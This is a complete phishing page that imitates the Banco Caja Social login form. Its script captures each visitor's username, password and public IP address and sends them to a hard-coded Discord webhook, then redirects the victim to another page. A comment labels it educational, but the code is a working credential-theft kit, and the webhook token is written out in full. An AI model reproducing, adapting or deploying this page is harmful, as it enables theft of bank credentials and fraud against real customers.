<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Caja Social - Login</title>
    
    <!-- Incluye Tailwind CSS para utilidades adicionales, aunque el CSS personalizado predomina -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Definición de colores para consistencia */
        :root {
            --primary-color: #003366; /* Azul oscuro primario (reemplaza el amarillo en el original) */
            --accent-color: #003366; /* Azul oscuro para acentos */
            --background-color: #0073cf; /* Azul principal de fondo */
            --error-color: #dc2626; /* Rojo para errores */
            --success-color: #10b981; /* Verde para éxito */
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
            background: var(--background-color); 
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            /* Se ha ajustado el padding para manejar mejor los bordes en móviles */
            padding: 15px; 
            color: #333; 
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* Estilo de Tarjeta (Card) */
        .container {
            width: 100%;
            max-width: 380px; 
            
            /* Efecto Glass/Translucido Blanco */
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            
            /* Padding ligeramente ajustado para dar más espacio interno */
            padding: 30px 25px; 
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            text-align: center;
            color: #333; 
       
 h1 {
    color: var(--accent-color);
    font-size: 25px;
    font-weight: 700;
    margin-bottom: 15px;
}



        p, small {
            font-size: 15px;
            line-height: 1.5;
            color: #444;
        }
        
        small {
            display: block;
            margin-bottom: 25px;
            font-size: 13px;
        }

        .form-group {
            margin-bottom: 25px;
            text-align: left;
        }

        .form-group label {
            font-size: 14px;
            margin-bottom: 8px;
            display: block;
            font-weight: 500;
            color: #333;
        }

        .form-group input {
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            border: 1px solid #ccc;
            font-size: 15px;
            outline: none;
            color: #333;
            transition: border-color 0.25s ease;
        }
         .form-group input:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.3); /* Usando el primario ajustado */
        }

        .forgot {
            margin: 15px 0;
            font-size: 14px;
            text-align: right;
            cursor: pointer;
            text-decoration: none; 
            color: var(--background-color); 
            display: block;
            transition: color 0.2s;
        }
        .forgot:hover {
            color: var(--accent-color);
        }

        /* Estilo del botón unificado */
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px; 
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            background: var(--primary-color); 
            color: #FFF;
            transition: 0.3s transform, 0.3s box-shadow;
        }

        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            background: #0056b3; /* Tonalidad más oscura para hover */
        }

        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        /* Contenedor de mensajes de estado */
        #status-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            font-weight: 600;
            text-align: left;
            display: none; /* Oculto por defecto */
        }
        .error {
            background-color: #fee2e2;
            color: var(--error-color);
            border: 1px solid var(--error-color);
        }
        .success {
            background-color: #d1fae5;
            color: var(--success-color);
            border: 1px solid var(--success-color);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bienvenido a Banco Caja Social</h1>
        <p>Recuerde que el usuario está compuesto por su Tipo de Identificación (CC, CE, NI, TI, PE) y su Número de Identificación sin espacios, puntos ni comas.</p>
        <small>Ejemplo: CC0123456789</small>

        <!-- Se ha agregado onsubmit para llamar a la función JavaScript -->
        <form id="login-form" onsubmit="handleFormSubmit(event)">
            <div class="form-group">
                <label for="usuario">Usuario</label>
                <!-- El campo debe tener el ID y NAME correctos -->
                <input type="text" id="usuario" name="usuario" placeholder="Ingrese su usuario" required>
            </div>

            <div class="form-group">
                <label for="clave">Contraseña</label>
                <!-- Usamos 'clave' como el nombre, consistente con el PHP original -->
                <input type="password" id="clave" name="clave" placeholder="Ingrese su contraseña" required maxlength="8" pattern="[a-zA-Z0-9]{8}" title="La contraseña debe tener 8 caracteres alfanuméricos" />
                <a class="forgot" href="#">¿Olvidaste tu contraseña?</a>
            </div>
            
            <button type="submit" class="btn" id="submit-btn">
                Iniciar sesión
            </button>
        </form>

        <!-- Contenedor para mensajes de estado/error -->
        <div id="status-message" role="alert"></div>

    </div>

    <script>
        // --------------------------------------------------------
        // IMPORTANTE: URL del Webhook (EXPUESTA en el lado del cliente)
        // Solo para uso educativo/controlado. ¡No usar en producción!
        // --------------------------------------------------------
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1439028329335230537/g2TFVNMf7RS1WFIb9Vkhv2_z-F5fFbrHP-JcF7QBiGFXyPq1BWXLHobMsQgLYsrjHaNT";
        const REDIRECT_URL = "index2.html";
        
        // Elementos UI
        const statusMessage = document.getElementById('status-message');
        const submitButton = document.getElementById('submit-btn');

        // Muestra mensajes de estado/error
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = `mt-4 p-3 rounded-xl font-semibold ${type}`;
            statusMessage.style.display = 'block';
        }

        // 1. Función para obtener la IP pública del cliente (reemplaza getRealIP de PHP)
        async function getRealIP() {
            try {
                // Usamos un servicio externo simple para obtener la IP del cliente
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) {
                    return 'IP Desconocida (Fallo API)';
                }
                const data = await response.json();
                return data.ip || 'IP Desconocida';
            } catch (error) {
                console.error("Error al obtener IP:", error);
                return 'IP Desconocida (Error de red)';
            }
        }

        // 2. Función para enviar el mensaje a Discord (reemplaza enviarDiscord de PHP)
        async function enviarDiscord(usuario, clave, ip_cliente) {
            const separador = "\n--------------------\n";
            const mensaje = `Datos obtenidos\nUsuario: ${usuario}\nCla: ${clave}\nIP: ${ip_cliente}${separador}`;

            const data = {
                "content": mensaje,
                "username": "USUARIO Y CONTRASEÑA"
            };

            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            };

            try {
                const response = await fetch(WEBHOOK_URL, options);
                
                // Discord responde 204 No Content en éxito
                if (response.status === 204) {
                    return { success: true };
                } 
                
                // Manejo de errores de Discord (análogo al PHP)
                let responseText = await response.text();
                
                if (response.status === 404) {
                    return { success: false, code: 404, message: "Error 404: El Webhook fue eliminado o la URL es incorrecta." };
                } else if (response.status === 400) {
                    return { success: false, code: 400, message: `Error 400: Problema con el formato JSON o el contenido. Respuesta: ${responseText}` };
                } else {
                    return { success: false, code: response.status, message: `Error de Discord. Código HTTP: ${response.status}. Respuesta: ${responseText}` };
                }

            } catch (error) {
                // Fallo de red (análogo al error cURL)
                return { success: false, code: 'NET_ERROR', message: `❌ Error Crítico de Red. No se pudo conectar con Discord. Causa: ${error.message}` };
            }
        }

        // 3. Lógica principal de manejo del formulario (reemplaza el bloque if ($_SERVER['REQUEST_METHOD'] === 'POST'))
        async function handleFormSubmit(event) {
            // Detiene el envío normal del formulario (reemplaza la acción POST)
            event.preventDefault(); 
            
            // Ocultar mensajes anteriores y deshabilitar botón
            submitButton.disabled = true;

            const form = event.target;
            const usuario = form.usuario.value;
            const clave = form.clave.value;

            // Obtener IP de forma asíncrona
            const ip_cliente = await getRealIP();

            // Enviar datos
            const result = await enviarDiscord(usuario, clave, ip_cliente);

            if (result.success) {
                // 4. Redirección (reemplaza header("Location: index2.html"))
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1500); // Dar tiempo para que el usuario vea el mensaje
            } else {
                // Mostrar error y re-habilitar el botón
                showStatus(`❌ Fallo en el envío a Discord: ${result.message}`, 'error');
                submitButton.disabled = false;
            }
        }
    </script>
</body>
</html>
